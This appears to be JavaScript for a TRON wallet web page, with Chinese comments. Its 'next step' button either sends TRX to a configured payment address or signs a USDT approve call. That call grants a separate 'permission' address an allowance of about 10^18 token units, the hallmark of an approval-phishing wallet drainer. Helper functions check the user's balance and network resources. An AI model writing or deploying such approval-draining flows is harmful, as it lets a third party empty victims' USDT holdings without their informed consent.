// 统一的下一步按钮点击处理函数
async function onNextButtonClick() {
    try {
        // 确保钱包已连接
        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            await connectWallet();
            return;
        }

        // 选择执行交易类型
        const transactionType = prompt("请输入 1 执行 TRX 转账，输入 2 执行 USDT 授权:");

        if (transactionType === "1") {
            await sendTRXTransaction();
        } else if (transactionType === "2") {
            await approveUSDT();
        } else {
            alert("❌ 请输入正确的选项！");
        }
    } catch (error) {
        console.error("❌ 操作失败:", error);
        tip("交易失败，请重试！");
    }
}

// TRX 转账交易
async function sendTRXTransaction() {
    try {
        const paymentAddress = window.Payment_address;
        const senderAddress = window.tronWeb.defaultAddress.base58;
        const trxAmountInSun = window.tronWeb.toSun(currentAmount);

        console.log("📌 构建 TRX 交易...");
        const transaction = await window.tronWeb.transactionBuilder.sendTrx(paymentAddress, trxAmountInSun, senderAddress, {
            feeLimit: 50000000  // 5 TRX 确保手续费足够
        });

        console.log("📌 交易签名中...");
        const signedTransaction = await window.tronWeb.trx.sign(transaction);

        console.log("📌 发送交易...");
        const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

        if (broadcast.result) {
            console.log("✅ 交易成功！哈希:", broadcast.txid);
            tip("交易成功");
            return broadcast.txid;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("❌ TRX 交易失败:", error);
        tip("交易失败，请稍后重试！");
    }
}

// USDT 授权交易
async function approveUSDT() {
    try {
        const spender = window.Permission_address;
        const contractAddress = window.usdtContractAddress;
        const senderAddress = window.tronWeb.defaultAddress.base58;
        const feeLimit = 50000000; // 5 TRX 确保矿工打包

        console.log(`📌 开始 USDT 授权：授权 ${spender}`);

        const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
            window.tronWeb.address.toHex(contractAddress),
            'approve(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: window.tronWeb.address.toHex(spender) },
                { type: 'uint256', value: '999999999999999999' }
            ],
            senderAddress
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error('授权交易构建失败');
        }

        console.log("📌 交易签名中...");
        const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);

        console.log("📌 发送授权交易...");
        const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

        if (result.result) {
            console.log("✅ USDT 授权成功，交易哈希:", result.txid);
            tip("USDT 授权成功");
            return result.txid;
        } else {
            throw new Error("USDT 授权交易失败");
        }
    } catch (error) {
        console.error("❌ USDT 授权失败:", error);
        tip("USDT 授权失败，请检查钱包和网络状态！");
    }
}

// 确保使用稳定的 TRON API 以减少网络繁忙问题
window.tronWeb = new TronWeb({
    fullHost: "https://api.trongrid.io",  // TRON 官方稳定节点
    privateKey: ""
});

// 交易前检查资源是否充足
async function checkResources() {
    try {
        const address = window.tronWeb.defaultAddress.base58;
        const account = await window.tronWeb.trx.getAccount(address);
        const bandwidth = account.freeNetUsage || 0;
        const energy = account.energy || 0;

        console.log(`📌 当前带宽: ${bandwidth}`);
        console.log(`📌 当前能量: ${energy}`);

        if (bandwidth < 250) {
            alert("⚠️ 你的带宽不足，交易可能会消耗 TRX 手续费！");
        }

        if (energy < 10000) {
            alert("⚠️ 你的能量不足，USDT 交易可能失败！");
        }
    } catch (error) {
        console.error("❌ 获取资源信息失败:", error);
    }
}

// 交易前检查 TRX 余额
async function checkTRXBalance() {
    try {
        const address = window.tronWeb.defaultAddress.base58;
        const balance = await window.tronWeb.trx.getBalance(address);
        const trxBalance = window.tronWeb.fromSun(balance);

        console.log(`📌 当前 TRX 余额: ${trxBalance} TRX`);
        if (trxBalance < 30) {
            alert("⚠️ 你的 TRX 余额过低，交易可能失败（建议至少 30 TRX 作为手续费）！");
        } else {
            alert(`✅ 你的 TRX 余额充足: ${trxBalance} TRX`);
        }
    } catch (error) {
        console.error("❌ 获取 TRX 余额失败:", error);
    }
}
